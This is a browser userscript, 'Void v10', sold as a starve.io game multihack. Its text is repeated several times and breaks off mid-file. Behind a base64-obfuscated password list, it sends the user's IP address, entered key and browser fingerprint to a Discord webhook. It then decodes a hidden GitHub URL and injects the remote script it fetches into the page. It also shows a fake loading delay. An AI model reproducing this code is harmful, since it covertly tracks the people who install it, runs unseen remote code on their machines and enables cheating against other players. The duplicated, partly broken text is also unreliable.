                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
